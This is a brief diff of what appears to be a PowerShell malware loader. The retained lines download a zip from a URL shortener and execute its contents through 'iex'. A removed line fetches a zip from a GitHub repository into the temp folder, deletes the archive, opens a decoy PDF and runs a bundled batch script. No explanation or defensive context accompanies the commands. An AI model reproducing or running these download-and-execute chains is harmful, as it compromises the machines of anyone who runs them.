@@ -7,11 +7,3 @@ wget 'bit.ly/4203S7k' -OutFile pay.zip
 Expand-Archive pay.zip
 cd pay
 type pay1.txt | iex
-
-
-
-
-
-
-
-cd $env:temp; wget -Uri 'github.com/ablink1n/SH/raw/main/1.zip' -OutFile 1.zip; Expand-Archive 1.zip; del -Fo 1.zip; cd 1; ii BarryChen.pdf; .\scr1.bat
